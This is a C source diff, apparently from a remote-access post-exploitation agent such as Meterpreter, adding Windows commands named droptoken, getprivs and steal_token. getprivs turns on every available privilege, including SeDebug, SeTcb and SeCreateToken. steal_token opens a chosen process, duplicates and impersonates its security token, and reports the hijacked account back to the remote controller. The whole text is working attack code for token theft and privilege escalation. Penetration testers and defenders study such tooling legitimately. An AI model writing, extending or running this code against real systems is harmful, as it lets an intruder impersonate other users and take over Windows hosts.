@@ -51,6 +51,228 @@ DWORD request_sys_config_getuid(Remote *remote, Packet *packet)
 	return res;
 }
 
+/*
+ * sys_droptoken
+ * ----------
+ *
+ * Drops an existing thread token
+ */
+DWORD request_sys_config_drop_token(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	DWORD res = ERROR_SUCCESS;
+	CHAR username[512], username_only[512], domainname_only[512];
+	LPVOID TokenUserInfo[4096];
+	HANDLE token;
+	DWORD user_length = sizeof(username_only), domain_length = sizeof(domainname_only);
+	DWORD size = sizeof(username), sid_type = 0, returned_tokinfo_length;
+
+	memset(username, 0, sizeof(username));
+	memset(username_only, 0, sizeof(username_only));
+	memset(domainname_only, 0, sizeof(domainname_only));
+
+	do
+	{
+		core_update_thread_token(remote, NULL);
+		
+		if (!GetTokenInformation(remote->hThreadToken, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
+		{
+			res = GetLastError();
+			break;
+		}
+		
+		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
+		{
+			res = GetLastError();
+			break;
+		}
+
+ 		// Make full name in DOMAIN\USERNAME format
+		_snprintf(username, 512, "%s\\%s", domainname_only, username_only);
+		username[511] = '\0';
+
+		packet_add_tlv_string(response, TLV_TYPE_USER_NAME, username);
+
+	} while (0);
+
+	// Transmit the response
+	packet_transmit_response(res, remote, response);
+
+	return res;
+}
+
+/*
+ * sys_getprivs
+ * ----------
+ *
+ * Obtains as many privileges as possible
+ * Based on the example at http://nibuthomas.com/tag/openprocesstoken/
+ */
+DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	DWORD res = ERROR_SUCCESS;
+	HANDLE token = NULL;
+	int x;
+	TOKEN_PRIVILEGES priv = {0};
+	LPCTSTR privs[] = {
+		SE_DEBUG_NAME,
+		SE_TCB_NAME,
+		SE_CREATE_TOKEN_NAME,
+		SE_ASSIGNPRIMARYTOKEN_NAME,
+		SE_LOCK_MEMORY_NAME,
+		SE_INCREASE_QUOTA_NAME,
+		SE_UNSOLICITED_INPUT_NAME,
+		SE_MACHINE_ACCOUNT_NAME,
+		SE_SECURITY_NAME,
+		SE_TAKE_OWNERSHIP_NAME,
+		SE_LOAD_DRIVER_NAME,
+		SE_SYSTEM_PROFILE_NAME,
+		SE_SYSTEMTIME_NAME,
+		SE_PROF_SINGLE_PROCESS_NAME,
+		SE_INC_BASE_PRIORITY_NAME,
+		SE_CREATE_PAGEFILE_NAME,
+		SE_CREATE_PERMANENT_NAME,
+		SE_BACKUP_NAME,
+		SE_RESTORE_NAME,
+		SE_SHUTDOWN_NAME,
+		SE_AUDIT_NAME,
+		SE_SYSTEM_ENVIRONMENT_NAME,
+		SE_CHANGE_NOTIFY_NAME,
+		SE_REMOTE_SHUTDOWN_NAME,
+		SE_UNDOCK_NAME,
+		SE_SYNC_AGENT_NAME,         
+		SE_ENABLE_DELEGATION_NAME,  
+		SE_MANAGE_VOLUME_NAME,
+		0
+	};
+
+	do
+	{
+		if( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token ))  {
+			res = GetLastError();
+			break;
+		}
+
+		for( x = 0; privs[x]; ++x )
+		{
+			memset(&priv, 0, sizeof(priv));
+			LookupPrivilegeValue(NULL, privs[x], &priv.Privileges[0].Luid );    
+			priv.PrivilegeCount = 1;    
+			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    
+			if(AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0 )) {
+				if(GetLastError() == ERROR_SUCCESS) {
+					packet_add_tlv_string(response, TLV_TYPE_PRIVILEGE, privs[x]);
+				}
+			} else {
+				dprintf("[getprivs] Failed to set privilege %s (%u)", privs[x], GetLastError());
+			}
+		}  
+	} while (0);
+
+	if(token)
+		CloseHandle(token);
+
+	// Transmit the response
+	packet_transmit_response(res, remote, response);
+
+	return res;
+}
+
+/*
+ * sys_steal_token
+ * ----------
+ *
+ * Steals the primary token from an existing process
+ */
+DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
+{
+	Packet *response = packet_create_response(packet);
+	DWORD res = ERROR_SUCCESS;
+	CHAR username[512], username_only[512], domainname_only[512];
+	LPVOID TokenUserInfo[4096];
+	HANDLE token = NULL;
+	HANDLE handle = NULL;
+	HANDLE xtoken = NULL;
+	DWORD pid;
+	DWORD user_length = sizeof(username_only), domain_length = sizeof(domainname_only);
+	DWORD size = sizeof(username), sid_type = 0, returned_tokinfo_length;
+
+	memset(username, 0, sizeof(username));
+	memset(username_only, 0, sizeof(username_only));
+	memset(domainname_only, 0, sizeof(domainname_only));
+
+	do
+	{
+		// Get the process identifier that we're attaching to, if any.
+		pid = packet_get_tlv_value_uint(packet, TLV_TYPE_PID);
+
+		if (!pid) {
+			res = -1;
+			break;
+		}
+
+		handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+
+		if(!handle) {
+			res = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to open process handle for %d (%u)", pid, res);
+			break;
+		}
+
+		if(! OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_IMPERSONATE, &token)){
+			res = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", pid, res);
+			break;
+		}
+
+		if(! ImpersonateLoggedOnUser(token)) {
+			res = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", pid, res);
+			break;	
+		}
+	
+		if(! DuplicateToken(token, SecurityImpersonation, &xtoken)) {
+			res = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to duplicate token for %d (%u)", pid, res);
+			break;	
+		}
+
+		core_update_thread_token(remote, xtoken);
+
+		if (! GetTokenInformation(token, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
+		{
+			res = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to get token information for %d (%u)", pid, res);
+			break;
+		}
+		
+		if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
+		{
+			res = GetLastError();
+			dprintf("[STEAL-TOKEN] Failed to lookup sid for %d (%u)", pid, res);
+			break;
+		}
+
+ 		// Make full name in DOMAIN\USERNAME format
+		_snprintf(username, 512, "%s\\%s", domainname_only, username_only);
+		username[511] = '\0';
+
+		packet_add_tlv_string(response, TLV_TYPE_USER_NAME, username);
+
+	} while (0);
+
+	if(handle)
+		CloseHandle(handle);
+	
+	if(token)
+		CloseHandle(token);
+
+	// Transmit the response
+	packet_transmit_response(res, remote, response);
+
+	return res;
+}
 
 /*
  * sys_sysinfo
